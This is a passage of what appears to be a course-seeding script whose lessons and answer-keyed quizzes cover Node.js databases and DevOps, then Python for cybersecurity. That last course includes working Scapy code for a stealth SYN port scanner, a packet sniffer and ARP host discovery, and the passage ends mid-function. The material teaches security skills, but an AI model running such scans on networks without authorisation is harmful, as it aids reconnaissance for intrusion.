- Implement CRUD operations and middleware
- Use aggregation pipelines for complex queries
- Handle validation and data integrity

### Section 1: Mongoose Schemas

Mongoose provides schema-based modeling for MongoDB. Schemas define document structure, validation, methods, and virtuals. MongoDB is schema-flexible, but Mongoose adds structure for application consistency.

\`\`\`javascript
const mongoose = require('mongoose');

const userSchema = new mongoose.Schema({
  email: { type: String, required: true, unique: true, lowercase: true },
  name: { type: String, required: true, trim: true },
  profile: {
    bio: String,
    avatar: String,
    socialLinks: [{ platform: String, url: String }]
  }
}, { timestamps: true });

userSchema.methods.toJSON = function() {
  const obj = this.toObject();
  delete obj.__v;
  return obj;
};

module.exports = mongoose.model('User', userSchema);
\`\`\`

### Section 2: CRUD Operations

Mongoose provides create, find, findOne, updateOne, and deleteOne operations. Chaining methods enables complex queries. Populate joins documents across collections.

### Section 3: Middleware and Hooks

Pre and post hooks run before or after operations. Common uses include validation, hashing passwords, logging, and cascading deletes. Hooks enable cross-cutting concerns without cluttering business logic.

### Section 4: Aggregation Pipeline

MongoDB aggregation framework processes documents through stages. Common stages include $match (filter), $group (aggregate), $project (reshape), $sort, and $lookup (join).

### Hands-On Practice

1. Design a Mongoose schema for an e-commerce product catalog.
2. Implement middleware for automatic password hashing.
3. Build an aggregation pipeline for product analytics.

### Key Takeaways

- Mongoose adds structure to schema-flexible MongoDB
- Middleware handles cross-cutting concerns cleanly
- Aggregation pipelines enable complex data analysis
- Proper validation prevents data integrity issues

### References

- Mongoose Documentation: https://mongoosejs.com/
- MongoDB University: https://university.mongodb.com/
- MongoDB Aggregation: https://docs.mongodb.com/manual/aggregation/`,
            questions: [
              { text: 'What does Mongoose add to MongoDB?', answers: [{ text: 'Schema-based structure, validation, and middleware', isCorrect: true }, { text: 'SQL query support', isCorrect: false }, { text: 'ACID transactions only', isCorrect: false }, { text: 'Graph database features', isCorrect: false }] },
              { text: 'What are Mongoose pre/post hooks used for?', answers: [{ text: 'Running logic before or after database operations', isCorrect: true }, { text: 'Connecting to the database', isCorrect: false }, { text: 'Creating database indexes', isCorrect: false }, { text: 'Managing database connections', isCorrect: false }] },
              { text: 'What does the $lookup aggregation stage do?', answers: [{ text: 'Joins documents from another collection', isCorrect: true }, { text: 'Filters documents', isCorrect: false }, { text: 'Groups documents', isCorrect: false }, { text: 'Sorts documents', isCorrect: false }] },
              { text: 'What is the benefit of timestamps in Mongoose schemas?', answers: [{ text: 'Automatically manages createdAt and updatedAt fields', isCorrect: true }, { text: 'Increases query performance', isCorrect: false }, { text: 'Reduces document size', isCorrect: false }, { text: 'Enables full-text search', isCorrect: false }] },
            ],
          },
          {
            title: 'Database Migrations & Seeding',
            order: 3,
            content: `# Database Migrations & Seeding

### Learning Objectives

- Implement database migration strategies
- Create seed data for development and testing
- Handle schema changes in production
- Use migration rollback for disaster recovery

### Section 1: Migration Strategies

Migrations track schema changes over time. Each migration is a versioned script that applies specific changes. Forward migrations apply changes; rollback migrations revert them. Migration history provides a complete record of schema evolution.

### Section 2: Seed Data

Seed scripts populate databases with initial or test data. Use seeds for development environments, testing fixtures, and reference data. Seed scripts should be idempotent — safe to run multiple times without duplicating data.

\`\`\`javascript
// seed.js
const { PrismaClient } = require('@prisma/client');
const bcrypt = require('bcrypt');

const prisma = new PrismaClient();

async function seed() {
  const hashedPassword = await bcrypt.hash('password123', 10);

  await prisma.user.upsert({
    where: { email: 'admin@example.com' },
    update: {},
    create: {
      email: 'admin@example.com',
      name: 'Admin User',
      password: hashedPassword,
      role: 'ADMIN'
    }
  });

  console.log('Database seeded!');
}

seed()
  .catch(console.error)
  .finally(() => prisma.\$disconnect());
\`\`\`

### Section 3: Production Migrations

Production migrations require careful planning. Test migrations in staging first. Use transactional migrations where possible. Schedule migrations during maintenance windows. Backup before applying.

### Section 4: Migration Rollback

Rollback scripts revert specific migrations. Maintain rollback scripts for every forward migration. Test rollbacks regularly. Use rollback procedures as part of disaster recovery planning.

### Hands-On Practice

1. Create a migration strategy for a multi-environment application.
2. Write idempotent seed scripts for development and testing.
3. Practice rolling back a migration and verifying data integrity.

### Key Takeaways

- Migrations provide version control for database schemas
- Seed scripts should be idempotent for safe repeated execution
- Production migrations require staging testing and backup
- Rollback scripts enable disaster recovery

### References

- Prisma Migrations: https://www.prisma.io/docs/concepts/components/prisma-migrate
- Knex Migrations: https://knexjs.org/guide/migrations.html
- Database Version Control: https://flywaydb.org/`,
            questions: [
              { text: 'What does idempotent seed scripts mean?', answers: [{ text: 'Safe to run multiple times without duplicating data', isCorrect: true }, { text: 'Only works once', isCorrect: false }, { text: 'Requires manual intervention', isCorrect: false }, { text: 'Deletes existing data', isCorrect: false }] },
              { text: 'What should production migrations include?', answers: [{ text: 'Staging testing, backup, and scheduled maintenance window', isCorrect: true }, { text: 'Direct application to production', isCorrect: false }, { text: 'No testing required', isCorrect: false }, { text: 'Automatic rollback only', isCorrect: false }] },
              { text: 'Why maintain rollback scripts?', answers: [{ text: 'Enable disaster recovery and schema reversion', isCorrect: true }, { text: 'Speed up migrations', isCorrect: false }, { text: 'Reduce database size', isCorrect: false }, { text: 'Improve query performance', isCorrect: false }] },
              { text: 'What is the purpose of migration history?', answers: [{ text: 'Complete record of all schema changes over time', isCorrect: true }, { text: 'Store application logs', isCorrect: false }, { text: 'Cache query results', isCorrect: false }, { text: 'Manage user sessions', isCorrect: false }] },
            ],
          },
          {
            title: 'Query Optimization',
            order: 4,
            content: `# Query Optimization

### Learning Objectives

- Identify slow database queries using EXPLAIN
- Create effective indexes for common query patterns
- Optimize N+1 query problems
- Implement query performance monitoring

### Section 1: Query Analysis

EXPLAIN ANALYZE shows query execution plans. Key metrics: rows scanned, index usage, sort operations, and join methods. Sequential scans on large tables indicate missing indexes.

\`\`\`sql
-- Analyze query performance
EXPLAIN ANALYZE
SELECT u.name, COUNT(p.id) as post_count
FROM users u
LEFT JOIN posts p ON p.author_id = u.id
WHERE u.created_at > '2024-01-01'
GROUP BY u.id
ORDER BY post_count DESC
LIMIT 10;
\`\`\`

### Section 2: Index Strategy

Indexes speed up queries by avoiding sequential scans. B-tree indexes work for equality and range queries. Composite indexes match multi-column WHERE clauses. Partial indexes reduce index size for filtered queries.

### Section 3: N+1 Query Problem

N+1 queries occur when fetching a list and then individual related records for each item. Use eager loading (include/join) to fetch all data in a single query. Prisma supports include and select for relation loading.

\`\`\`javascript
// Bad: N+1 queries
const users = await prisma.user.findMany();
for (const user of users) {
  user.posts = await prisma.post.findMany({
    where: { authorId: user.id }
  });
}

// Good: Single query with relations
const users = await prisma.user.findMany({
  include: { posts: true }
});
\`\`\`

### Section 4: Performance Monitoring

Monitor query performance in production. Use database-specific tools: pg_stat_statements for PostgreSQL, db.currentOp() for MongoDB. Set up alerts for slow queries.

### Hands-On Practice

1. Use EXPLAIN ANALYZE to identify slow queries in an existing application.
2. Create indexes that improve query performance by at least 10x.
3. Identify and fix N+1 query problems in an application.

### Key Takeaways

- EXPLAIN ANALYZE reveals query execution details
- Proper indexes can improve performance by orders of magnitude
- N+1 queries are a common performance killer
- Production query monitoring catches performance regressions

### References

- PostgreSQL EXPLAIN: https://www.postgresql.org/docs/current/using-explain.html
- MongoDB Query Optimization: https://docs.mongodb.com/manual/tutorial/optimize-query-performance/
- Prisma Query Optimization: https://www.prisma.io/docs/guides/performance-and-optimization`,
            questions: [
              { text: 'What does EXPLAIN ANALYZE show?', answers: [{ text: 'Query execution plan including rows scanned and index usage', isCorrect: true }, { text: 'Only the query result', isCorrect: false }, { text: 'Database size only', isCorrect: false }, { text: 'Connection status only', isCorrect: false }] },
              { text: 'What is the N+1 query problem?', answers: [{ text: 'Fetching a list and then individual records for each item', isCorrect: true }, { text: 'Querying 1 database from N servers', isCorrect: false }, { text: 'Having N indexes on a table', isCorrect: false }, { text: 'Running N queries in parallel', isCorrect: false }] },
              { text: 'What type of index works for range queries?', answers: [{ text: 'B-tree index', isCorrect: true }, { text: 'Hash index', isCorrect: false }, { text: 'GiST index', isCorrect: false }, { text: 'GIN index', isCorrect: false }] },
              { text: 'How do you fix N+1 queries in Prisma?', answers: [{ text: 'Use include to eagerly load related records', isCorrect: true }, { text: 'Add more indexes', isCorrect: false }, { text: 'Use raw SQL queries', isCorrect: false }, { text: 'Increase database connections', isCorrect: false }] },
            ],
          },
        ],
      },
      {
        title: 'Testing, Deployment & DevOps',
        order: 4,
        lessons: [
          {
            title: 'Unit & Integration Testing',
            order: 1,
            content: `# Unit & Integration Testing

### Learning Objectives

- Write unit tests for React components and Node.js functions
- Set up integration tests for API endpoints
- Use testing libraries effectively
- Achieve meaningful test coverage

### Section 1: Unit Testing Fundamentals

Unit tests verify individual functions and components in isolation. Use Jest for test execution, React Testing Library for component testing, and mock functions for dependencies. Test behavior, not implementation.

\`\`\`javascript
import { render, screen, fireEvent } from '@testing-library/react';
import Counter from './Counter';

test('increments counter on button click', () => {
  render(<Counter />);
  const button = screen.getByRole('button', { name: /increment/i });
  fireEvent.click(button);
  expect(screen.getByText('Count: 1')).toBeInTheDocument();
});
\`\`\`

### Section 2: Integration Testing

Integration tests verify interactions between components and services. Test API endpoints with supertest. Mock external services. Test database operations with test databases.

### Section 3: Test Configuration

Configure test environments for different contexts. Use setup files for global test configuration. Mock external dependencies. Use test databases that are reset between test runs.

### Section 4: Coverage and Quality

Aim for meaningful coverage, not 100% line coverage. Focus on critical paths, edge cases, and error handling. Use coverage reports to identify untested code.

### Hands-On Practice

1. Write unit tests for a utility function library.
2. Create integration tests for a REST API endpoint.
3. Set up a test database with automatic cleanup between tests.

### Key Takeaways

- Test behavior, not implementation details
- Integration tests verify component interactions
- Meaningful coverage focuses on critical paths
- Test databases ensure isolation and reproducibility

### References

- Jest: https://jestjs.io/
- React Testing Library: https://testing-library.com/
- Testing Best Practices: https://github.com/testing-library/react-testing-library`,
            questions: [
              { text: 'What should unit tests verify?', answers: [{ text: 'Individual functions and components in isolation', isCorrect: true }, { text: 'The entire application', isCorrect: false }, { text: 'Database performance', isCorrect: false }, { text: 'Network latency', isCorrect: false }] },
              { text: 'What is the focus of meaningful test coverage?', answers: [{ text: 'Critical paths, edge cases, and error handling', isCorrect: true }, { text: '100% line coverage always', isCorrect: false }, { text: 'Only happy path scenarios', isCorrect: false }, { text: 'Only component rendering', isCorrect: false }] },
              { text: 'What does React Testing Library emphasize?', answers: [{ text: 'Testing component behavior from the user perspective', isCorrect: true }, { text: 'Testing component implementation', isCorrect: false }, { text: 'Testing CSS styles', isCorrect: false }, { text: 'Testing build process', isCorrect: false }] },
              { text: 'Why use test databases?', answers: [{ text: 'Ensure isolation and reproducibility of tests', isCorrect: true }, { text: 'Speed up production databases', isCorrect: false }, { text: 'Reduce development costs', isCorrect: false }, { text: 'Replace production databases', isCorrect: false }] },
            ],
          },
          {
            title: 'CI/CD Pipeline',
            order: 2,
            content: `# CI/CD Pipeline

### Learning Objectives

- Design and implement CI/CD pipelines
- Automate testing, building, and deployment
- Implement quality gates and approval processes
- Monitor pipeline health and performance

### Section 1: Continuous Integration

CI automates building, testing, and code quality checks on every commit. GitHub Actions, GitLab CI, and Jenkins provide pipeline automation. Quality gates prevent broken code from reaching production.

\`\`\`yaml
# .github/workflows/ci.yml
name: CI Pipeline
on: [push, pull_request]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
        with:
          node-version: '18'
          cache: 'npm'
      - run: npm ci
      - run: npm run lint
      - run: npm run typecheck
      - run: npm test -- --coverage
      - run: npm run build
\`\`\`

### Section 2: Continuous Deployment

CD automates deployment to staging and production. Deployment strategies include blue-green (zero-downtime), canary (gradual rollout), and rolling (incremental update). Environment-specific configurations manage different deployment targets.

### Section 3: Quality Gates

Quality gates enforce standards before deployment: test coverage thresholds, lint compliance, type checking, security scanning, and performance benchmarks. Failed gates block deployment.

### Section 4: Pipeline Optimization

Cache dependencies between runs. Parallelize independent jobs. Use matrix builds for multiple environments. Monitor pipeline execution time and optimize bottlenecks.

### Hands-On Practice

1. Set up a GitHub Actions CI pipeline with lint, test, and build steps.
2. Implement a CD pipeline with staging and production environments.
3. Create quality gates that enforce test coverage and type checking.

### Key Takeaways

- CI automates build and test on every commit
- CD automates deployment with various strategies
- Quality gates prevent broken code from reaching production
- Pipeline optimization reduces feedback loop time

### References

- GitHub Actions: https://docs.github.com/en/actions
- GitLab CI: https://docs.gitlab.com/ee/ci/
- CD Best Practices: https://cloud.google.com/architecture/`,
            questions: [
              { text: 'What does Continuous Integration automate?', answers: [{ text: 'Building, testing, and quality checks on every commit', isCorrect: true }, { text: 'Only deployment to production', isCorrect: false }, { text: 'Only code review', isCorrect: false }, { text: 'Only documentation generation', isCorrect: false }] },
              { text: 'What is a quality gate?', answers: [{ text: 'Enforced standards that must pass before deployment', isCorrect: true }, { text: 'A physical entrance to the data center', isCorrect: false }, { text: 'A firewall rule', isCorrect: false }, { text: 'A load balancer', isCorrect: false }] },
              { text: 'What deployment strategy provides zero downtime?', answers: [{ text: 'Blue-green deployment', isCorrect: true }, { text: 'Direct replacement', isCorrect: false }, { text: 'Manual deployment', isCorrect: false }, { text: 'Scheduled downtime', isCorrect: false }] },
              { text: 'How can pipeline execution be optimized?', answers: [{ text: 'Caching dependencies, parallelizing jobs, and matrix builds', isCorrect: true }, { text: 'Running all jobs sequentially', isCorrect: false }, { text: 'Removing test steps', isCorrect: false }, { text: 'Using manual triggers only', isCorrect: false }] },
            ],
          },
          {
            title: 'Docker Deployment',
            order: 3,
            content: `# Docker Deployment

### Learning Objectives

- Create optimized Dockerfiles for Node.js applications
- Set up Docker Compose for multi-service development
- Implement production-ready container configurations
- Use Docker in CI/CD pipelines

### Section 1: Optimized Dockerfiles

Multi-stage builds separate build and runtime stages, reducing final image size. Use production-only dependencies. Run as non-root user. Implement health checks.

\`\`\`dockerfile
# Build stage
FROM node:18-alpine AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production
COPY . .
RUN npm run build

# Production stage
FROM node:18-alpine
WORKDIR /app
COPY --from=builder /app/dist ./dist
COPY --from=builder /app/node_modules ./node_modules
COPY --from=builder /app/package.json ./
USER node
EXPOSE 3000
HEALTHCHECK --interval=30s CMD wget -q --spider http://localhost:3000/health
CMD ["node", "dist/server.js"]
\`\`\`

### Section 2: Docker Compose

Docker Compose defines multi-container environments. Separate services for API, database, cache, and worker processes. Volume mounts for development. Environment-specific overrides.

### Section 3: Production Configuration

Use specific image tags, not latest. Implement resource limits. Configure logging drivers. Set up networking with explicit bridge networks. Use Docker secrets for sensitive data.

### Section 4: CI/CD Integration

Build images in CI pipelines. Push to container registries. Use image scanning for vulnerabilities. Implement deployment automation.

### Hands-On Practice

1. Create an optimized multi-stage Dockerfile for a Node.js application.
2. Set up Docker Compose with API, PostgreSQL, and Redis services.
3. Implement container health checks and resource limits.

### Key Takeaways

- Multi-stage builds significantly reduce image size
- Non-root users improve container security
- Health checks enable orchestration platforms to manage containers
- Docker Compose simplifies multi-service development

### References

- Docker Best Practices: https://docs.docker.com/develop/develop-images/dockerfile_best-practices/
- Docker Compose: https://docs.docker.com/compose/
- Node.js Docker Guide: https://github.com/nodejs/docker-node`,
            questions: [
              { text: 'What do multi-stage Docker builds accomplish?', answers: [{ text: 'Reduce final image size by separating build and runtime stages', isCorrect: true }, { text: 'Make builds faster only', isCorrect: false }, { text: 'Add more security features', isCorrect: false }, { text: 'Enable Docker Swarm', isCorrect: false }] },
              { text: 'Why use a non-root user in Docker?', answers: [{ text: 'Prevents container root from potentially escaping to host root', isCorrect: true }, { text: 'Improves performance', isCorrect: false }, { text: 'Reduces memory usage', isCorrect: false }, { text: 'Required by Docker only', isCorrect: false }] },
              { text: 'What does a Docker health check do?', answers: [{ text: 'Enables orchestration platforms to detect and manage unhealthy containers', isCorrect: true }, { text: 'Scans for vulnerabilities', isCorrect: false }, { text: 'Optimizes network traffic', isCorrect: false }, { text: 'Manages container logs', isCorrect: false }] },
              { text: 'Why should Docker images use specific tags?', answers: [{ text: 'Using "latest" tag is non-deterministic and can cause unexpected behavior', isCorrect: true }, { text: 'Specific tags are always smaller', isCorrect: false }, { text: 'It is required by Docker Hub', isCorrect: false }, { text: 'Specific tags scan faster', isCorrect: false }] },
            ],
          },
          {
            title: 'Monitoring & Logging',
            order: 4,
            content: `# Monitoring & Logging

### Learning Objectives

- Implement application logging best practices
- Set up monitoring with metrics and alerts
- Use distributed tracing for microservices
- Create operational dashboards

### Section 1: Logging Best Practices

Structured logging with JSON format enables machine parsing. Use log levels appropriately (error, warn, info, debug). Include correlation IDs for request tracing. Never log sensitive data.

\`\`\`javascript
const winston = require('winston');

const logger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json()
  ),
  defaultMeta: { service: 'api-server' },
  transports: [
    new winston.transports.File({ filename: 'error.log', level: 'error' }),
    new winston.transports.File({ filename: 'combined.log' })
  ]
});

logger.info('User created', { userId: user.id, action: 'register' });
\`\`\`

### Section 2: Metrics Collection

Prometheus collects time-series metrics. Key application metrics: request rate, error rate, latency (RED metrics), and saturation. Infrastructure metrics: CPU, memory, disk, and network.

### Section 3: Distributed Tracing

OpenTelemetry provides vendor-neutral distributed tracing. Trace requests across services. Identify bottlenecks in microservice architectures. Jaeger and Zipkin visualize trace data.

### Section 4: Alerting Design

Alert on symptoms (high error rate, high latency) not causes (high CPU). Use severity levels. Implement escalation policies. Avoid alert fatigue with proper thresholds and grouping.

### Hands-On Practice

1. Implement structured logging with correlation IDs in an Express application.
2. Set up Prometheus metrics collection for a Node.js application.
3. Configure alerts for error rate and latency thresholds.

### Key Takeaways

- Structured logging enables machine-parseable log analysis
- RED metrics (Rate, Errors, Duration) provide application health visibility
- Distributed tracing identifies bottlenecks in microservices
- Effective alerting focuses on symptoms, not causes

### References

- Winston Logger: https://github.com/winstonjs/winston
- Prometheus: https://prometheus.io/
- OpenTelemetry: https://opentelemetry.io/`,
            questions: [
              { text: 'What are RED metrics?', answers: [{ text: 'Rate, Errors, and Duration — key application health indicators', isCorrect: true }, { text: 'Random, Encrypted, and Distributed', isCorrect: false }, { text: 'Request, Event, and Data', isCorrect: false }, { text: 'Resource, Execution, and Debug', isCorrect: false }] },
              { text: 'Why should alerts focus on symptoms?', answers: [{ text: 'Symptoms directly impact users; causes are implementation details', isCorrect: true }, { text: 'Symptoms are easier to detect', isCorrect: false }, { text: 'Causes cannot be monitored', isCorrect: false }, { text: 'It reduces alert count', isCorrect: false }] },
              { text: 'What does structured logging provide?', answers: [{ text: 'Machine-parseable JSON logs for automated analysis', isCorrect: true }, { text: 'Smaller log files only', isCorrect: false }, { text: 'Faster log writing', isCorrect: false }, { text: 'Automatic log rotation', isCorrect: false }] },
              { text: 'What is the purpose of correlation IDs?', answers: [{ text: 'Track requests across multiple services in distributed systems', isCorrect: true }, { text: 'Encrypt log data', isCorrect: false }, { text: 'Reduce log volume', isCorrect: false }, { text: 'Manage log rotation', isCorrect: false }] },
            ],
          },
        ],
      },
    ],
  );

  // ====================================================================
  // 5. Python for Cybersecurity & Automation
  // ====================================================================
  await createCourseWithQuizzes(
    prisma,
    'Python for Cybersecurity & Automation',
    'Comprehensive Python course focused on cybersecurity applications. Students learn Python fundamentals, network analysis with Scapy, security automation scripting, and building custom security tools for penetration testing and defense.',
    35,
    [
      {
        title: 'Python Fundamentals for Security',
        order: 1,
        lessons: [
          {
            title: 'Python Data Structures & Control Flow',
            order: 1,
            content: `# Python Data Structures & Control Flow

### Learning Objectives

- Master Python data structures for security tool development
- Implement control flow for automated scanning scripts
- Write functions and list comprehensions for data processing
- Handle exceptions in security tool contexts

### Section 1: Core Data Structures

Python provides built-in data structures essential for security tool development. Lists store collections of targets or findings. Dictionaries map hosts to open ports. Sets track unique vulnerabilities. Tuples provide immutable records.

\`\`\`python
# Security-relevant data structures
targets = ['192.168.1.1', '192.168.1.2', '192.168.1.3']

# Dictionary mapping hosts to open ports
scan_results = {
    '192.168.1.1': {22, 80, 443},
    '192.168.1.2': {80, 8080},
    '192.168.1.3': {21, 22}
}

# List comprehension for filtering vulnerable hosts
vulnerable = [host for host, ports in scan_results.items() if 22 in ports]
\`\`\`

### Section 2: Control Flow for Scanning

Loops enable iterating over target ranges. Conditionals filter results based on criteria. Range functions generate IP ranges. Break and continue control scan flow.

\`\`\`python
# Iterate over target subnet
for host in range(1, 255):
    target = f'192.168.1.{host}'
    if is_alive(target):
        print(f'Host {target} is up')
        ports = scan_common_ports(target)
        if not ports:
            continue
        results[target] = ports
\`\`\`

### Section 3: Functions and Modules

Functions encapsulate reusable security logic. Default arguments simplify tool configuration. *args and **kwargs provide flexible parameter passing. Modules organize related functions.

### Section 4: List Comprehensions & Generators

List comprehensions process security data efficiently. Generator expressions handle large datasets without loading everything into memory. Nested comprehensions transform complex data structures.

\`\`\`python
# Generator for lazy scanning
def generate_targets(cidr):
    network = ipaddress.ip_network(cidr)
    for ip in network.hosts():
        yield str(ip)

# Process results lazily
for target in generate_targets('192.168.1.0/24'):
    result = scan(target)
\`\`\`

### Hands-On Practice

1. Write a function that parses nmap XML output into a Python dictionary.
2. Create a list comprehension that filters hosts with specific open ports.
3. Build a target generator that yields IP addresses from CIDR notation.

### Key Takeaways

- Python data structures map naturally to security data
- List comprehensions enable concise data filtering
- Generators handle large datasets efficiently
- Functions and modules organize reusable security logic

### References

- Python Documentation: https://docs.python.org/3/
- Python for Security: https://www.amazon.com/Black-Hat-Python-2nd-Edition/dp/1593279280
- Automate the Boring Stuff: https://automatetheboringstuff.com/`,
            questions: [
              { text: 'Which data structure maps hosts to open ports?', answers: [{ text: 'Dictionary', isCorrect: true }, { text: 'List', isCorrect: false }, { text: 'Tuple', isCorrect: false }, { text: 'String', isCorrect: false }] },
              { text: 'What is the benefit of generators for security scanning?', answers: [{ text: 'Process large target sets without loading everything into memory', isCorrect: true }, { text: 'Run scans faster', isCorrect: false }, { text: 'Encrypt scan results', isCorrect: false }, { text: 'Bypass firewalls', isCorrect: false }] },
              { text: 'How do you iterate over a subnet in Python?', answers: [{ text: 'Using ipaddress module and for loop over network hosts', isCorrect: true }, { text: 'Using while loop only', isCorrect: false }, { text: 'Using recursive function only', isCorrect: false }, { text: 'Manually listing each IP', isCorrect: false }] },
              { text: 'What does a list comprehension provide?', answers: [{ text: 'Concise syntax for filtering and transforming collections', isCorrect: true }, { text: 'Faster execution than loops', isCorrect: false }, { text: 'Automatic error handling', isCorrect: false }, { text: 'Built-in encryption', isCorrect: false }] },
            ],
          },
          {
            title: 'File & System Operations',
            order: 2,
            content: `# File & System Operations

### Learning Objectives

- Read and write log files for security analysis
- Parse CSV, JSON, and XML security data formats
- Interact with the operating system for security tasks
- Handle file permissions and access control

### Section 1: File Operations

Python's built-in file handling reads logs, writes reports, and processes security data. Context managers ensure proper file closure. Encoding parameters handle different file formats.

\`\`\`python
from pathlib import Path

# Read log file with error handling
def read_log_file(filepath):
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            return f.readlines()
    except FileNotFoundError:
        print(f'Log file not found: {filepath}')
        return []
    except PermissionError:
        print(f'Permission denied: {filepath}')
        return []

# Write scan report
def write_report(results, filename):
    with open(filename, 'w') as f:
        for host, ports in results.items():
            f.write(f'{host}: {", ".join(map(str, ports))}\\n')
\`\`\`

### Section 2: Data Format Parsing

Security tools output data in various formats. CSV for structured logs. JSON for API responses. XML for nmap output. Python's standard library handles all formats.

\`\`\`python
import csv
import json
import xml.etree.ElementTree as ET

# Parse CSV log
def parse_csv_log(filepath):
    with open(filepath, 'r') as f:
        reader = csv.DictReader(f)
        return [row for row in reader]

# Parse JSON scan results
def parse_json_results(filepath):
    with open(filepath, 'r') as f:
        return json.load(f)

# Parse nmap XML output
def parse_nmap_xml(filepath):
    tree = ET.parse(filepath)
    root = tree.getroot()
    hosts = []
    for host in root.findall('host'):
        addr = host.find('address').get('addr')
        ports = [port.get('portid') for port in host.findall('.//port')]
        hosts.append({'ip': addr, 'ports': ports})
    return hosts
\`\`\`

### Section 3: System Operations

os and subprocess modules interact with the operating system. Run system commands, check processes, manage environment variables, and handle file system operations.

### Section 4: Path Handling

Pathlib provides object-oriented path manipulation. Cross-platform path handling. Glob patterns for file discovery. Directory traversal for log collection.

### Hands-On Practice

1. Build a log parser that extracts failed login attempts from syslog.
2. Create a report generator that writes findings in JSON and CSV formats.
3. Write a directory scanner that finds all .log files in a given path.

### Key Takeaways

- Context managers prevent file handle leaks
- Standard library handles CSV, JSON, and XML parsing
- pathlib provides cross-platform path manipulation
- Proper error handling prevents tool crashes on missing files

### References

- Python File I/O: https://docs.python.org/3/tutorial/inputoutput.html
- pathlib Documentation: https://docs.python.org/3/library/pathlib.html
- csv Module: https://docs.python.org/3/library/csv.html`,
            questions: [
              { text: 'Why use context managers (with statement) for files?', answers: [{ text: 'Ensure proper file closure even when exceptions occur', isCorrect: true }, { text: 'Make file reading faster', isCorrect: false }, { text: 'Encrypt file contents', isCorrect: false }, { text: 'Reduce file size', isCorrect: false }] },
              { text: 'Which module parses XML output from nmap?', answers: [{ text: 'xml.etree.ElementTree', isCorrect: true }, { text: 'csv', isCorrect: false }, { text: 'json', isCorrect: false }, { text: 'os', isCorrect: false }] },
              { text: 'What does pathlib provide?', answers: [{ text: 'Object-oriented, cross-platform path manipulation', isCorrect: true }, { text: 'Network socket operations only', isCorrect: false }, { text: 'Database connectivity only', isCorrect: false }, { text: 'Web scraping only', isCorrect: false }] },
              { text: 'What is the benefit of json.load() for security data?', answers: [{ text: 'Parses JSON API responses into native Python objects', isCorrect: true }, { text: 'Encrypts JSON data', isCorrect: false }, { text: 'Compresses JSON files', isCorrect: false }, { text: 'Validates JSON syntax only', isCorrect: false }] },
            ],
          },
        ],
      },
      {
        title: 'Network Analysis with Scapy',
        order: 2,
        lessons: [
          {
            title: 'Packet Crafting & Analysis',
            order: 1,
            content: `# Packet Crafting & Analysis

### Learning Objectives

- Craft custom network packets using Scapy
- Analyze and dissect captured network traffic
- Implement packet sniffers for security monitoring
- Build network fuzzers for vulnerability discovery

### Section 1: Scapy Fundamentals

Scapy is a powerful Python library for packet manipulation. It can craft, send, receive, and analyze packets. Scapy works at the raw socket level, providing full control over packet fields.

\`\`\`python
from scapy.all import *

# Create a simple TCP SYN packet
packet = IP(dst="192.168.1.1") / TCP(dport=80, flags="S")
print(packet.summary())

# Send packet and receive response
response = sr1(packet, timeout=2)
if response:
    print(f"Response flags: {response[TCP].flags}")
\`\`\`

### Section 2: Packet Dissection

Scapy layers packet protocols. Each layer provides access to protocol-specific fields. Raw bytes can be decoded into structured packet objects.

\`\`\`python
# Sniff and analyze packets
def packet_callback(packet):
    if packet.haslayer(IP):
        print(f"Source: {packet[IP].src}")
        print(f"Destination: {packet[IP].dst}")
        print(f"Protocol: {packet[IP].proto}")
    if packet.haslayer(TCP):
        print(f"Source Port: {packet[TCP].sport}")
        print(f"Dest Port: {packet[TCP].dport}")
        print(f"Flags: {packet[TCP].flags}")

# Sniff 100 packets
sniff(prn=packet_callback, count=100)
\`\`\`

### Section 3: Port Scanner

Build a SYN port scanner using Scapy. SYN scan is stealthier than connect scan because it never completes the TCP handshake.

\`\`\`python
def syn_scan(target, ports):
    results = []
    for port in ports:
        packet = IP(dst=target) / TCP(dport=port, flags="S")
        response = sr1(packet, timeout=1, verbose=0)
        if response and response[TCP].flags == 0x12:
            results.append(port)
    return results

open_ports = syn_scan("192.168.1.1", [22, 80, 443, 8080])
\`\`\`

### Section 4: Network Fuzzing

Craft malformed packets to test protocol implementations. Fuzzers send unexpected data to find vulnerabilities. Combine with crash detection for automated testing.

### Hands-On Practice

1. Build a packet sniffer that captures and analyzes HTTP traffic.
2. Implement a SYN port scanner with parallel scanning capabilities.
3. Create a simple network fuzzer that tests DNS query handling.

### Key Takeaways

- Scapy provides full control over packet creation and analysis
- SYN scanning is stealthier than full connect scanning
- Packet dissection enables deep traffic analysis
- Fuzzing discovers protocol implementation vulnerabilities

### References

- Scapy Documentation: https://scapy.readthedocs.io/
- Black Hat Python: https://nostarch.com/black-hat-python2
- Network Security with Python: https://github.com/securitytube/python-for-pentesters`,
            questions: [
              { text: 'Why is SYN scanning stealthier than connect scanning?', answers: [{ text: 'It never completes the TCP handshake', isCorrect: true }, { text: 'It uses encryption', isCorrect: false }, { text: 'It runs faster', isCorrect: false }, { text: 'It uses UDP instead', isCorrect: false }] },
              { text: 'What does Scapy provide?', answers: [{ text: 'Full control over packet creation and analysis at raw socket level', isCorrect: true }, { text: 'Web application testing only', isCorrect: false }, { text: 'Database security only', isCorrect: false }, { text: 'File encryption only', isCorrect: false }] },
              { text: 'What is the TCP flag 0x12?', answers: [{ text: 'SYN-ACK, indicating the port is open', isCorrect: true }, { text: 'FIN, indicating connection closed', isCorrect: false }, { text: 'RST, indicating connection refused', isCorrect: false }, { text: 'ACK, indicating acknowledgment', isCorrect: false }] },
              { text: 'What is the purpose of packet fuzzing?', answers: [{ text: 'Discover vulnerabilities by sending unexpected or malformed data', isCorrect: true }, { text: 'Encrypt network traffic', isCorrect: false }, { text: 'Speed up network connections', isCorrect: false }, { text: 'Reduce network latency', isCorrect: false }] },
            ],
          },
          {
            title: 'Network Scanning & Enumeration',
            order: 2,
            content: `# Network Scanning & Enumeration

### Learning Objectives

- Perform network discovery and host enumeration
- Enumerate services and versions on live hosts
- Identify OS fingerprints from network responses
- Build automated network reconnaissance tools

### Section 1: Host Discovery

Determine which hosts are alive on a network. Use ICMP ping, ARP requests, or TCP SYN probes. Each method has different network traversal characteristics.

\`\`\`python
from scapy.all import *
import ipaddress

def discover_hosts(network):
    hosts = []
    net = ipaddress.ip_network(network)
    # ARP request for local network
    ans, _ = arping(str(net), timeout=2, verbose=0)
    for _, rcv in ans:
